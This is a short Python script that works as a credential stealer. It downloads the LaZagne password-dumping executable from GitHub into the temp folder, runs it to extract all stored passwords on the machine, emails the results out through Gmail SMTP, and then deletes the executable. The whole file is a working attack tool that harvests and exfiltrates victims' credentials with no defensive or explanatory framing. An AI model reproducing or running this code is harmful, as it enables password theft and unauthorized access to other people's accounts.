import requests
import smtplib
import subprocess
import os
import tempfile

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def download(url):
    response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.2/lazagne.exe")
result = subprocess.check_output("laZagne.exe all", shell = True)
send_mail("email", "pass", result)
os.remove("laZagne.exe")
